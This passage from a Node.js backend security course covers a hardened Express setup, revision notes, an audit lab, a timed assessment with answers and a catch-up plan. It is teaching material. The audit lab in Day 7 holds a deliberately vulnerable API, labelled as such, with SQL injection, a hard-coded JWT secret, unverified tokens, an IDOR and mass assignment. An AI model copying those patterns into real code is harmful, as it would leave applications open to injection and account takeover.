- Memorize categories: injection, access control, auth/session, secrets, config, logging, dependencies, transport.
- Always add ownership checks and negative tests.
- Never leak internals; log them privately.

### 6.4 Putting it together: the hardened app `[ESSENTIAL]`

```js
// src/app.js
import express from 'express';
import cookieParser from 'cookie-parser';
import { config } from './config.js';
import { securityHeaders, corsMiddleware, apiLimiter } from './middleware/security.js';
import { authRouter } from './routes/auth.js';
import { accountsRouter } from './routes/accounts.js';
import { adminRouter } from './routes/admin.js';
import { errorHandler, notFound } from './errors.js';

export function createApp() {
  const app = express();

  app.disable('x-powered-by');
  // Behind exactly one reverse proxy/load balancer in production: trust one hop (adjust to YOUR topology)
  if (config.env === 'production') app.set('trust proxy', 1);

  app.use(securityHeaders);                  // helmet
  app.use(corsMiddleware);                   // exact-origin allow-list
  app.get('/healthz', (req, res) => res.json({ ok: true })); // before the rate limiter
  app.use(apiLimiter);                       // global rate limit
  app.use(express.json({ limit: '10kb' }));  // body size cap
  app.use(cookieParser());

  app.use('/auth', authRouter);              // signup, login, refresh, logout (their own limiters inside)
  app.use('/accounts', accountsRouter);      // authenticate + ownership checks inside
  app.use('/admin', adminRouter);            // authenticate + requireRole('admin') inside

  app.use(notFound);
  app.use(errorHandler);                     // must be last
  return app;
}
```

```js
// src/server.js
import { createApp } from './app.js';
import { config } from './config.js';
import { checkDb, closeDb } from './db/mysql.js';

await checkDb(); // fail fast if the database is unreachable or credentials are wrong

const app = createApp();
const server = app.listen(config.port, () => {
  console.log(`API listening on port ${config.port} (${config.env})`);
});

// Slow-client protection
server.requestTimeout = 30_000;
server.headersTimeout = 15_000;

let shuttingDown = false;
async function shutdown(signal) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`${signal} received, shutting down`);

  server.close(async () => {          // stop accepting new connections, finish in-flight requests
    await closeDb();                  // then release DB connections
    process.exit(0);
  });

  setTimeout(() => process.exit(1), 10_000).unref(); // force exit if something hangs
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
```

Order matters: security headers and CORS first (so even error and 429 responses carry them), body parsers before routes, error handler last. Graceful shutdown details are in Week 6 / Day 5 notes.

### Day 6 wrap-up

**Key concepts to remember**

- Config from env, validated at startup, frozen; never default a secret; `.env` is local-only.
- Secrets: never in git, per-environment, least privilege, rotate (rotation fixes leaks), secret managers in production.
- JWT key rotation with `kid`; `crypto.randomBytes` for tokens; `timingSafeEqual` for comparisons.
- Production checklist: injection, access control, auth/session, CORS/cookies, secrets, errors/logging, dependencies, limits and timeouts.
- Middleware order in the hardened app.

**Five revision questions**

1. Why validate configuration at startup, and what should the error output never contain?
2. A secret was committed to a public repo yesterday. What do you do, in order?
3. Explain JWT key rotation using `kid`. What is the minimum waiting time before removing the old key?
4. List six items from a backend security review checklist and the fix for each.
5. Why does the order `helmet -> cors -> rate limit -> body parser -> routes -> error handler` make sense?

**One practical coding task**

Replace the Day 1 config stub with the zod version, remove every direct `process.env` read outside `config.js`, add a unit-style script that starts the config module with a missing `DB_PASSWORD` and asserts the process exits with a message naming the variable (and not any secret value). Then add a `gitleaks`-style check: write a tiny script that scans your repo for strings matching `JWT_ACCESS_SECRET=` in tracked files and fails if found.

**Self-assessment checklist**

- [ ] I can explain environment-based config and fail-fast validation.
- [ ] I can explain what to do when a secret leaks.
- [ ] I can list at least ten production security mistakes with fixes.
- [ ] I can explain why error messages and logs are security-relevant.
- [ ] I can assemble helmet, CORS, rate limiting, body limits and the error handler in the right order.

---

## Day 7 - Revision, security audit lab, weekly test

**Time plan (about 2 hours):** 25 min spaced revision, 30 min security audit lab, 15 min speaking drill, 35 min weekly assessment (timed, below), 15 min grading + weak-area notes.

**Learning objectives**

- Revisit this week's topics using the 1-day, 3-day and 7-day spacing.
- Review an intentionally broken API like a security reviewer and produce a prioritized list of fixes.
- Explain this week's topics aloud in interview style, with time limits.
- Take the weekly assessment without notes, grade it honestly, and decide what to repair.

### 7.1 Spaced revision for today

| Interval | Revisit | What to do (10 minutes each) |
|---|---|---|
| About 1 day ago | Day 6: config, secrets, production checklist | Recite the checklist categories; explain what to do when a secret leaks |
| About 3 days ago | Day 4: refresh rotation, RBAC | Draw the rotation flow from memory; write `requireRole` without looking |
| About 7 days ago | Day 1: pool, transactions (and Week 4 / Day 4-5 locking) | Write `withTransaction` and the guarded transfer from memory |
| Quick skim | Day 2, Day 3, Day 5 | Read only the Revision notes and Key concepts blocks |

Schedule for the next week (see the master spaced-revision table in file 00): re-read Day 3 and Day 5 notes after 1 day and 3 days of Week 6 starts, because auth and injection questions return in every mock interview.

### 7.2 Security audit lab: find the bugs `[ESSENTIAL]`

Below is an API written the way a rushed beginner might write it. Every line marked with a number is a problem. Before reading the answer key, list all the problems you can find (aim for 15 or more).

**NEVER DO: this entire snippet is deliberately broken**

```js
// NEVER DO -- audit exercise. Do not copy any of this.
import express from 'express';
import jwt from 'jsonwebtoken';
import cors from 'cors';
import { pool } from './db/mysql.js';

const app = express();
app.use(cors({ origin: true, credentials: true }));                                   // (1)
app.use(express.json());                                                              // (2)
const SECRET = 'secret';                                                              // (3)

app.post('/login', async (req, res) => {
  const [rows] = await pool.query(
    `SELECT * FROM users WHERE email = '${req.body.email}'`,                          // (4)
  );
  const user = rows[0];
  if (!user) return res.status(404).json({ message: 'No such user' });                // (5)
  if (user.password !== req.body.password) {                                          // (6)
    return res.status(401).json({ message: 'Wrong password' });
  }
  const token = jwt.sign(
    { id: user.id, role: user.role, email: user.email, password: user.password },     // (7)
    SECRET,                                                                           // (8)
  );                                                                                  // (9) no expiry
  res.cookie('token', token);                                                         // (10)
  res.json({ token, user });                                                          // (11)
});

app.get('/orders/:id', async (req, res) => {
  const payload = jwt.decode(req.headers.authorization);                              // (12)
  const [rows] = await pool.query('SELECT * FROM orders WHERE id = ' + req.params.id);// (13)
  res.json(rows[0]);                                                                  // (14)
});

app.post('/users', async (req, res) => {
  await pool.query('INSERT INTO users SET ?', req.body);                              // (15)
  res.sendStatus(201);
});

app.use((err, req, res, next) => res.status(500).json({ stack: err.stack }));         // (16)
app.listen(3000);                                                                     // (17)
```

**Answer key**

| # | Problem | Fix |
|---|---|---|
| 1 | CORS reflects any origin with credentials | Exact allow-list of origins |
| 2 | No body size limit | `express.json({ limit: '10kb' })` |
| 3 | Hard-coded, weak JWT secret in source | 256-bit random secret from env/secret manager |
| 4 | SQL injection via template literal | `pool.execute('... WHERE email = ?', [email])` |
| 5 | Unknown email gives a different response (user enumeration) | One generic 401 for all failures |
| 6 | Plain-text password comparison | bcrypt hash + `bcrypt.compare` (with dummy hash for timing) |
| 7 | Password hash and email placed inside the JWT (payload is readable) | Only `sub` and `role` |
| 8 | Weak secret reused directly (see 3) | Strong secret, `kid` rotation |
| 9 | No `expiresIn`: token valid forever | 15-minute expiry + refresh token rotation |
| 10 | Cookie without `httpOnly`, `secure`, `sameSite`, and the token also sent in JSON | Set all flags; refresh token only in cookie, access token in JSON body |
| 11 | Returns the whole user row including `password` | Return an explicit safe subset |
| 12 | `jwt.decode` (no verification), and it ignores the `Bearer ` prefix | `jwt.verify` with `algorithms`, `iss`, `aud` in an `authenticate` middleware |
| 13 | SQL injection via concatenation | Parameter and validate the id as an integer |
| 14 | IDOR: no ownership check | `WHERE id = ? AND user_id = ?` or compare after fetch |
| 15 | Mass assignment: client can set `role` and any column; also uses the object-expansion form | Validate with a strict schema; insert explicit columns |
| 16 | Stack trace leaked to the client | Generic 500, log the details privately |
| 17 | No helmet, no rate limiting, no timeouts, no graceful shutdown, no auth on any route | Add helmet, limiters (strict on `/login`), server timeouts, `authenticate` everywhere needed |

Bonus findings: no input validation anywhere, no HTTPS awareness (`secure` cookies and HSTS), no logging with redaction, and the `/users` endpoint is public so anyone can create admin accounts.

Scoring yourself: 10 found = good, 14 found = interview-ready, 17 found = strong. In an interview, walk through them by *category* (injection, authentication, authorization, secrets, error handling, transport/browser), not line by line.

### 7.3 Speaking drill (interview-style, answer aloud, 90 seconds each)

Record yourself or speak to a wall. Then compare with the Interview answer blocks in the days above.

1. How do you store passwords and why?
2. Explain access and refresh tokens and what rotation gives you.
3. What is SQL injection and exactly how do you prevent it in Node?
4. What is the difference between authentication and authorization? Give an IDOR example.
5. Explain CORS and CSRF and how they differ.
6. Your pool is exhausted in production. What do you check?
7. When would you choose MongoDB over MySQL?

### 7.4 Project mapping (file 12)

This week advances the Task Management API project:

- **Stage 3 (MySQL schema + data layer):** `pool`, `withTransaction`, `users`/`tasks` tables, parameterized queries. Acceptance: no string-built SQL anywhere (grep for `${` inside SQL strings), pool closed on shutdown.
- **Stage 4 (auth + RBAC):** signup/login/refresh/logout, bcrypt, access + rotating refresh tokens, `requireRole`, ownership checks on tasks. Acceptance: user A gets 404 on user B's task; refresh reuse revokes the family.
- **Stage 5 (transactions):** a multi-statement operation (for example "assign task + write audit log") inside `withTransaction`. Acceptance: forced failure in the second statement leaves no partial data.
- Security middleware from Day 5 and config from Day 6 feed Stage 6 (tests + logging + security middleware) next week.

### 7.5 Take the weekly assessment

Go to the "Week 5 assessment" section at the end of this file. Rules: no notes, 35 minutes, write answers on paper or in a text file, then grade with the answer key and use the weak-area guidance.

### Day 7 wrap-up

**Key concepts to remember**

- Parameterized queries + allow-lists; transactions on one connection; consistent lock order; guarded updates.
- Mongo: embed vs reference, ESR indexes, aggregation order, validate types against NoSQL injection.
- bcrypt/Argon2id; generic login errors; JWT is signed not encrypted; pin algorithms.
- Access + rotating hashed refresh tokens; 401 vs 403; ownership checks; RBAC middleware.
- XSS, CSRF, CORS, rate limiting and helmet: what each is, which defence belongs to which.
- Validated config, secrets never in git, rotate on leak, safe error handler.

**Five revision questions**

1. What goes wrong if two instances each keep an in-memory rate-limit counter?
2. Why does the refresh reuse branch return a status instead of throwing inside the transaction?
3. What makes `Model.create(req.body)` dangerous, and what is the fix?
4. Which header/flag combination protects a refresh cookie against XSS theft and CSRF?
5. A teammate says "we are safe from CSRF because we configured CORS". Respond.

**One practical coding task**

Take your lab from Days 1-6 and write a 15-line `scripts/attack.mjs` that tries: SQLi on `/users?email=...`, a NoSQL-style body on `/auth/login`, an IDOR on `/accounts/:id` with another user's token, a forged JWT with `role: admin`, a refresh-token replay, a cross-origin POST to `/auth/refresh`, and 15 failed logins. Every attempt must be blocked (400/401/403/404/429). Keep it as a regression script; Week 6 turns these into Supertest tests (`EX-TEST-01`).

**Self-assessment checklist**

- [ ] I finished the spaced revision items.
- [ ] I found at least 14 bugs in the audit lab.
- [ ] I answered all seven speaking-drill questions within time.
- [ ] I completed the weekly assessment and graded it.
- [ ] I wrote down my weak areas and scheduled their repair.

---

## Week 5 revision summary

Everything from this week in one page. Read it, then close the file and try to rebuild each bullet from memory.

**Data access (MySQL)**

- One pool per process; `connectionLimit x instances < max_connections`; finite queue and timeouts for fail-fast.
- `execute()` = real prepared statement; `query()` = client-side escaping; both safe with `?`; identifiers via allow-list; `LIMIT ?` caveat with `execute` on some versions.
- Transaction = one connection: `getConnection` -> `beginTransaction` -> work -> `commit`/`rollback` -> `release` in `finally`.
- Guarded UPDATE for business rules; `SELECT ... FOR UPDATE` in consistent order; retry on `ER_LOCK_DEADLOCK`; DECIMAL for money.
- ORM vs query builder vs raw SQL is a trade-off; understand generated SQL; beware N+1 and raw escape hatches.

**MongoDB**

- Documents/collections, `_id`, single-document atomicity, one `MongoClient` per process.
- Embed what is read together and bounded; reference shared/unbounded data; snapshot prices in orders.
- Indexes from query patterns (ESR), unique/TTL/partial, verify with `explain('executionStats')`.
- Aggregation: `$match` early, `$group`, `$unwind`, `$lookup`, `$facet`; keyset pagination for deep pages.
- NoSQL injection = untrusted operator objects; validate types.
- SQL vs NoSQL: decide by integrity needs, relationships and access patterns.

**Authentication**

- Passwords: bcrypt (cost ~12) or Argon2id, salt inside the hash, 72-byte limit, never fast hashes, never log them.
- Signup/login: validation, normalized email, unique index, no mass assignment, generic errors, equalized timing, rate limits.
- JWT: header.payload.signature, signed not encrypted, `verify` with `algorithms`, `iss`, `aud`, `exp` in seconds; `decode` is not `verify`; HS256 vs RS256; `alg: none` and algorithm confusion.
- Access (15 min, memory) + refresh (opaque, httpOnly cookie, hashed in DB, rotated, family revocation on reuse).
- Sessions vs JWT: revocation and state vs stateless scaling; hybrid is common.

**Authorization**

- 401 = not authenticated; 403 = not allowed; 404 to hide existence.
- Layers: route role, object ownership, field level. IDOR/BOLA is the classic bug. Roles in JWT are stale until expiry.

**Attacks and defences**

- SQLi: parameterize; least privilege; no DB errors to clients.
- XSS: output encoding; CSP; nosniff; httpOnly; sanitize allowed HTML with an allow-list library.
- CSRF: cookie auth only; SameSite, Origin check, CSRF token; not solved by CORS.
- CORS: browser-enforced; exact origins; credentials need exact origin; never reflect.
- Rate limiting: 429 + Retry-After; shared store for many instances; `trust proxy`; per-account throttling.
- helmet: baseline headers, not a fix.

**Configuration and secrets**

- Env-based config, validated at startup, frozen; `.env` local only; `--env-file`.
- Secrets never in git; per-environment; least privilege; rotate (and rotation is the real fix after a leak); secret manager in production; `kid` for JWT key rotation; `crypto.randomBytes`, `timingSafeEqual`.
- Central error handler hides internals; logs redact secrets.

---

## Week 5 assessment (35 minutes, no notes)

Scoring: Basic = 1 point, Intermediate = 2 points, Advanced = 3 points. Total 38.

### Basic (7 questions)

**B1.** Why do we hash passwords instead of encrypting them? Name one algorithm you would use and one you would never use.

**B2.** Name the three parts of a JWT. Can a user who holds a token read its payload? Should you put a password hash inside?

**B3.** A request arrives without a token to a protected route; another arrives with a valid token for a regular user to an admin-only route. Which status code does each get, and why?

**B4.** Is `pool.query('SELECT * FROM users WHERE id = ?', [id])` safe from SQL injection? Is `` pool.query(`SELECT * FROM users WHERE id = ${id}`) ``? Why?

**B5.** Why do backends use a connection pool instead of opening a connection per request?

**B6.** Which cookie attributes should a refresh-token cookie have, and what does each one do?

**B7.** True or false: "CORS stops attackers from calling my API." Explain.

### Intermediate (8 questions)

**I1.** What is wrong with this transaction code, and how do you fix it?

```js
async function placeOrder(userId, productId) {
  await pool.execute('START TRANSACTION');
  await pool.execute('INSERT INTO orders (user_id, product_id) VALUES (?, ?)', [userId, productId]);
  await pool.execute('UPDATE products SET stock = stock - 1 WHERE id = ?', [productId]);
  await pool.execute('COMMIT');
}
```

**I2.** Using the `orders` collection from Day 2 (fields `userId`, `status`, `totalPaise`), write an aggregation pipeline that returns the top 3 users by total spend on `paid` orders, including each user's email from the `users` collection.

**I3.** Describe refresh-token rotation with reuse detection. What do you store in the database and what do you send to the client?

**I4.** Why is storing the access token in `localStorage` risky, and what is the common alternative?

**I5.** A teammate writes `await Users.create(req.body)` for signup. What is the vulnerability, and how do you fix it?

**I6.** You run three instances behind a load balancer, each with `express-rate-limit` using the default memory store and a limit of 10 login attempts per 15 minutes. What is the effective limit, what else can go wrong, and what do you change?

**I7.** Design the best compound index for `db.orders.find({ userId, status: 'paid' }).sort({ createdAt: -1 })`. Explain your field order and how you would verify it.

**I8.** What is wrong with `if (payload.exp < Date.now()) throw new Error('expired')`?

### Advanced (5 questions)

**A1.** Implement (in words and key code lines) a money transfer between two accounts that cannot overdraw, cannot lose updates and avoids deadlocks. Explain the role of the guarded UPDATE, row locks and lock ordering.

**A2.** Explain the JWT algorithm-confusion attack against an RS256 service and the exact fix.

**A3.** Users with two browser tabs open sometimes get logged out right after the access token expires. The server rotates refresh tokens with reuse detection. Explain the cause and propose client-side and server-side mitigations.

**A4.** Your SPA is on `https://app.example.com` and the API on `https://api.example.com`. The refresh token lives in a cookie. Which `SameSite` value works, what CSRF defences do you still add, and what CORS settings are required? What changes if the API moves to `https://api.example.net`?

**A5.** A developer reports that the production JWT signing secret was pasted into a public GitHub issue 2 hours ago. Describe your incident response in order, including how to rotate without logging out every user for longer than necessary.

---

## Answers with explanations

### Basic answers

**B1.** Passwords must be verified, never recovered, so a one-way hash is the right primitive. Encryption is reversible: if the key leaks, every password leaks. Use a slow, salted, adaptive password hash such as bcrypt (cost about 12) or Argon2id. Never use MD5, SHA-1 or plain SHA-256: they are fast, so attackers test billions of guesses per second on GPUs. *Explanation:* the slowness and per-password salt are the security features, not a side effect. (Day 3, 3.1)

**B2.** Header, payload, signature (Base64URL, dot-separated). Yes, anyone who holds the token can Base64-decode and read the payload, because JWTs are signed, not encrypted. Never place a password hash or other secrets in it; keep claims minimal (`sub`, `role`, `exp`). *Explanation:* the signature only provides integrity, not confidentiality. (Day 3, 3.3)

**B3.** No token: 401 (unauthenticated: the server does not know who you are). Valid user token on an admin route: 403 (authenticated but not authorized). Optionally 404 when you do not want to reveal that a resource exists. *Explanation:* 401 is about identity, 403 about permission. (Day 4, 4.3)

**B4.** The first is safe: the `?` placeholder sends the value separately from the SQL text (the driver escapes it for `query()`, or a server-side prepared statement does it for `execute()`). The second is injectable: `id` becomes part of the SQL text, so `1 OR 1=1` changes the query structure. *Explanation:* the safety comes from separating code and data, not from the method name. (Day 1, 1.2; Day 5, 5.1)

**B5.** Opening a DB connection costs a TCP (and often TLS) handshake plus authentication, and the database has a limited `max_connections`. A pool reuses a bounded set of open connections, lowering latency and capping the load on the database. *Explanation:* it is both a performance and a protection mechanism. (Day 1, 1.1)

**B6.** `HttpOnly` (JavaScript cannot read it, limiting XSS theft), `Secure` (HTTPS only), `SameSite=Strict` or `Lax` (not sent on cross-site requests, CSRF defence), `Path=/auth` (only sent to auth endpoints), and a `Max-Age` matching the refresh token lifetime. *Explanation:* each attribute removes one attack path. (Day 4, 4.2)

**B7.** False. CORS is enforced by browsers to decide whether a *web page* may read a cross-origin response. `curl`, Postman, servers and mobile apps ignore it entirely, so it cannot stop anyone from calling your API. Authentication and authorization on the server do that. *Explanation:* CORS protects users' browsers, not your server. (Day 5, 5.4)

### Intermediate answers

**I1.** Each `pool.execute` call may run on a different pooled connection, so `START TRANSACTION`, the statements and `COMMIT` are not on the same session; the "transaction" does nothing and an error midway leaves partial data. Fix: check out one connection and run everything on it.

```js
async function placeOrder(userId, productId) {
  const conn = await pool.getConnection();
  try {
    await conn.beginTransaction();
    await conn.execute('INSERT INTO orders (user_id, product_id) VALUES (?, ?)', [userId, productId]);
    const [res] = await conn.execute(
      'UPDATE products SET stock = stock - 1 WHERE id = ? AND stock > 0',
      [productId],
    );
    if (res.affectedRows !== 1) throw new Error('Out of stock'); // also fixes overselling
    await conn.commit();
  } catch (err) {
    await conn.rollback();
    throw err;
  } finally {
    conn.release();
  }
}
```

*Explanation:* also note the original had no stock guard (stock could go negative) and no rollback or release on failure. (Day 1, 1.3)

**I2.**

```js
const top3 = await orders.aggregate([
  { $match: { status: 'paid' } },
  { $group: { _id: '$userId', totalSpentPaise: { $sum: '$totalPaise' } } },
  { $sort: { totalSpentPaise: -1 } },
  { $limit: 3 },
  { $lookup: { from: 'users', localField: '_id', foreignField: '_id', as: 'user' } },
  { $unwind: '$user' },
  { $project: { _id: 0, userId: '$_id', email: '$user.email', totalSpentPaise: 1 } },
]).toArray();
```

*Explanation:* `$match` first (index on `status` helps), group, sort and limit *before* `$lookup` so the join runs for only 3 documents, not for every user. (Day 2, 2.4)

**I3.** On login create a family id and a random 32-byte refresh token; store only `SHA-256(token)` with `user_id`, `family_id`, `expires_at`, `revoked_at`, `replaced_by_id`; send the raw token once in an httpOnly cookie. On refresh, lock the row, check it is valid, revoke it, issue a new token in the same family and return a new access token. If a revoked token shows up again, treat it as theft and revoke the whole family. *Explanation:* rotation makes tokens single-use; reuse detection turns theft into a visible event. (Day 4, 4.2)

**I4.** Any JavaScript running on the page (XSS, a compromised npm package, a browser extension) can read `localStorage` and exfiltrate the token. The common alternative: keep the short-lived access token in memory and the refresh token in an httpOnly, Secure, SameSite cookie scoped to the auth path. *Explanation:* httpOnly does not stop XSS but prevents the theft of a long-lived credential. (Day 4, 4.2; Day 5, 5.2)

**I5.** Mass assignment: the client can include `role: 'admin'` (or `id`, `isVerified`) and the model stores it. Fix: validate with a strict schema that accepts only `email` and `password`, build the insert explicitly with those fields, and set privileged fields on the server (role defaults to `user`; role changes need a separate admin-only endpoint). (Day 3, 3.2)

**I6.** Each instance counts separately, so an attacker can make up to 30 attempts per window (and the load balancer may distribute unevenly); counters also reset on every restart or deploy. Also check `trust proxy`, otherwise all users appear to come from the load balancer's IP. Change: use a shared store such as Redis (`rate-limit-redis`) for global counters, set `trust proxy` to the correct hop count, and add per-account throttling in addition to per-IP limits. (Day 5, 5.5)

**I7.** `db.orders.createIndex({ userId: 1, status: 1, createdAt: -1 })`. Equality fields (`userId`, `status`) first, then the sort field (`createdAt`): the ESR rule. MongoDB jumps to the matching `userId`/`status` entries which are already ordered by `createdAt` descending, so no in-memory sort is needed. Verify with `.explain('executionStats')`: stage `IXSCAN` (not `COLLSCAN`), no `SORT` stage, and `totalDocsExamined` close to `nReturned`. (Day 2, 2.3)

**I8.** Unit mismatch: `exp` is in seconds since the epoch, `Date.now()` is in milliseconds, so the comparison is almost always true or false incorrectly (tokens would look expired immediately). Compare `payload.exp * 1000 < Date.now()` or, better, let `jwt.verify` handle expiry. Also the code decodes without verifying signature if it only checks `exp`. (Day 3, 3.3)

### Advanced answers

**A1.** Use one transaction on one connection. (1) Validate the amount as a decimal string and reject `from === to`. (2) `SELECT id FROM accounts WHERE id IN (?, ?) ORDER BY id FOR UPDATE`: locks both rows in ascending id order, so two opposite transfers (A to B and B to A) acquire locks in the same order and cannot deadlock. (3) `UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?` and check `affectedRows === 1`: the balance check and the debit are one atomic statement, so there is no gap in which another transaction could change the balance (lost update/overdraw). (4) Credit the destination, insert an audit row, commit. (5) On error roll back and always release the connection. (6) Retry the entire transaction on `ER_LOCK_DEADLOCK` with a small backoff, and keep a `CHECK (balance >= 0)` constraint as the last safety net. Use `DECIMAL`, never floats. (Day 1, 1.3)

**A2.** A service signs with RS256 (private key) and verifies with its public key. If the verify call accepts the algorithm named in the token header, an attacker crafts a token with `alg: HS256`, signs it using the *public key* (which is public) as the HMAC secret, and the server, treating that same public key as an HMAC secret, validates it, so the attacker can forge any claims. Fix: pass an explicit `algorithms: ['RS256']` to `verify`, never choose the algorithm from the token, and use libraries that bind key types to algorithms. (Day 3, 3.3)

**A3.** Both tabs notice the expired access token and call `/auth/refresh` with the same refresh token at the same moment. The first request rotates it; the second carries a token that is already revoked, which the server interprets as reuse and revokes the whole family, logging the user out. Mitigations: client side, a single-flight refresh (one shared promise per tab) and cross-tab coordination (`BroadcastChannel` or `localStorage` events/Web Locks API) so only one tab refreshes; server side, a short grace period where the immediately previous token is accepted again and returns the same successor, while later reuse still triggers family revocation; also refresh proactively a little before expiry. (Day 4, 4.2)

**A4.** `app.example.com` and `api.example.com` are the same site (same registrable domain), so `SameSite=Strict` (or `Lax`) works for the cookie. Still add an Origin check on `/auth/refresh` and `/auth/logout` and keep state-changing endpoints off GET. CORS: allow exactly `https://app.example.com`, `credentials: true`, allowed headers `Content-Type` and `Authorization`, and the frontend uses `credentials: 'include'`. If the API moves to `example.net`, the setup is cross-site: the cookie needs `SameSite=None; Secure`, which means the browser will send it from other sites, so explicit CSRF defences (Origin verification and/or a CSRF token, custom header) become mandatory; third-party-cookie restrictions in some browsers may also break this model, so a same-site API domain (or a reverse proxy serving the API under the app's domain) is preferable. (Day 4, 4.2; Day 5, 5.3-5.4)

**A5.** In order: (1) *Contain*: generate a new strong secret immediately and deploy it; all tokens signed with the old secret must stop being accepted, which is the correct outcome because an attacker may hold forged ones. (2) To limit disruption use `kid` rotation: add the new key as active; because the old key is *compromised* you must NOT keep verifying with it, so remove it right away and accept that users re-authenticate (their refresh tokens in the database are still valid, so the client's refresh call issues a new access token silently; only the access tokens (up to 15 minutes) fail and are refreshed automatically). Revoke any refresh families created during the exposure window if you suspect abuse. (3) *Investigate*: review auth logs for tokens with unusual `sub`/`role` claims (especially admin) and for access from unfamiliar IPs since the post time. (4) *Clean up*: delete the post and, if relevant, scrub the history, noting that deleting does not undo exposure. (5) *Prevent*: secret scanning in CI, secrets in a manager, short token TTL, alerting. (6) *Document*: a blameless post-mortem. *Explanation:* the key point is rotation first; the refresh-token design means the user-facing impact is small. (Day 6, 6.2)

---

## Weak-area identification guidance

Grade yourself honestly. Score each answer: full marks only if you covered the key mechanism *and* the reason, not just the keyword.

| Score band (of 38) | Meaning | What to do |
|---|---|---|
| 32-38 | Strong. You can handle most junior-to-mid security/data questions | Spend the catch-up time on weak spots only; start Week 6 on schedule |
| 24-31 | Good with gaps | Repair the weak topics (table below) within 2 hours before Week 6 |
| 16-23 | Shaky | Re-read the Essential sections of the weak days, redo that day's coding task, retest those questions in 3 days |
| Below 16 | Needs a second pass | Use the catch-up plan below; do not start Week 6 until Day 3 and Day 4 topics are solid |

Map missed questions to the section to re-read:

| Missed | Topic | Re-read |
|---|---|---|
| B4, B5, I1, A1 | Pooling, query/execute, transactions, deadlocks | Day 1, sections 1.1-1.3 |
| I2, I7 | Aggregation, Mongo indexes | Day 2, sections 2.3-2.4 |
| B1, I5 | Password hashing, signup safety, mass assignment | Day 3, sections 3.1-3.2 |
| B2, I8, A2 | JWT structure, verification, attacks | Day 3, section 3.3 |
| B3, B6, I3, I4, A3 | Auth/authz, refresh tokens, cookies | Day 4, sections 4.2-4.3 |
| B4, B7, I6, A4 | SQLi, XSS, CSRF, CORS, rate limiting | Day 5 |
| A5 | Secrets and incident response | Day 6, section 6.2 |

Self-diagnosis questions:

- If you can *recite* definitions but cannot write the code, redo the coding task of that day without looking at the notes.
- If you can write code but cannot explain it, practice the Interview answer for that topic out loud, twice, then answer its follow-up questions aloud.
- If your mistakes are about "why" (why SHA-256 is enough for refresh tokens, why bcrypt is slow on purpose), rewrite the Concept paragraph in your own words.
- If you keep confusing CORS and CSRF, make a two-row table: who enforces it, what it protects, what it does *not* protect.

Also test yourself on the question bank: `Q-SEC-*` (file 10) and `Q-MONGO-*`, `Q-SQL-*` (file 09). Pick five at random and answer aloud.

---

## Catch-up plan if you fell behind

Honest principle: it is better to know the Essential material well than to skim everything. The `[ADVANCED]` tags tell you what to drop first.

**Behind by up to 1 day (Day 7 buffer absorbs it)**

- Use today's Day 7 slot to finish the missed day. Skip 7.2 detail (just read the answer key table), do the weekly assessment tomorrow morning for 35 minutes.

**Behind by 2-3 days**

Priority order (about 8 focused hours covers the essential spine):

1. Day 3 (auth basics: bcrypt, signup/login, JWT): 2 hours. Non-negotiable.
2. Day 4 sections 4.2-4.3 (refresh tokens, RBAC, IDOR): 1.5 hours. Non-negotiable.
3. Day 5 sections 5.1, 5.3, 5.4, 5.5 (SQLi, CSRF, CORS, rate limiting): 1.5 hours.
4. Day 1 sections 1.2-1.3 (placeholders, transactions): 1 hour.
5. Day 2 sections 2.1, 2.3, 2.4, 2.6 (Mongo basics, indexes, aggregation, NoSQL injection): 1.5 hours.
6. Day 6 sections 6.1-6.3 (config, secrets, checklist): 1 hour.

Defer: Day 1 ORM comparison details, Day 2 sections 2.2/2.5/2.7 read quickly only, Day 4 session-vs-JWT table (read the Interview answer only), Day 5 XSS detail beyond the Interview answer and helmet table, Day 6 key rotation and Secrets Manager code, and the SSRF/ReDoS/prototype-pollution rows.

**Behind by a full week**

- Do not try to "double up". Use the 8-hour spine above across the first 4 days of Week 6, running Week 6 topics at half speed (1 hour on Week 6 material, 1 hour on repair), and take the assessment on Week 6 Day 5 instead.
- Prioritize *writing code*: signup/login/refresh/RBAC in the lab and the attack script from 7.4. These double as Stage 4 of the project, so you are not losing project time.
- Use the speaking drill (7.3) daily for 10 minutes; fluency in explaining auth and injection improves fastest through repetition.

**What never to skip, even when time is short**

- Parameterized queries and why (SQLi).
- bcrypt and generic login errors.
- JWT structure, verification and the refresh/rotation idea.
- 401 vs 403 and ownership checks (IDOR).
- CORS vs CSRF difference.
- Secrets never in git, rotate on leak.

**Realistic expectation:** after this week you can build and explain a secure login and data-access layer at junior-to-mid interview level. Real security depth (threat modelling, cryptography details, compliance, penetration testing) takes much longer than eight weeks, and your interviews will mostly test the foundations covered here.

## REMAINING

None. All Week 5 sections (Day 1 to Day 7, weekly summary, assessment, answers, weak-area guidance, catch-up plan) are complete.
